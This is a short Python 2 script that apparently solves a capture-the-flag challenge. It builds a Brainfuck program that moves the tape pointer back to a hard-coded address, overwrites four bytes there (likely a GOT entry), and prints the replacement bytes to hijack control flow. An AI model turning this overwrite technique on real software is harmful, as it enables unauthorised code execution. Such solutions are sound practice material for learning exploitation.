#command = "+"*ord("s")
#command += ">"
#command += "+"*ord("h")
#command += "<<<"
command = ""
command += "<" * (0x804a0a0 - 0x804a018)
command += ",>,>,>,"
command += "."
command += "["

print command
print "\xe0\xe3\xe4\xf7"
